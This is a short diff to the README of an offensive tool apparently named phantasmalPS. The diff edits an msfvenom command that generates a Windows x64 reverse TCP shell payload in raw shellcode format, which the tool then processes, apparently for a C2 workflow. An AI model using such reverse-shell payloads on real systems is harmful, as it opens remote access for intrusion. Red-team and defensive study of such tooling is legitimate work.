@@ -18,7 +18,7 @@ python3 phantasmalPS.py -h
 
 First generate a shellcode within your favorite C2 framework:
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport 8443 -f ps1 -o shell
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport 8443 -f raw -o shell.bin
 ```
 Let phantasmalPS do its magic:
 ```bash
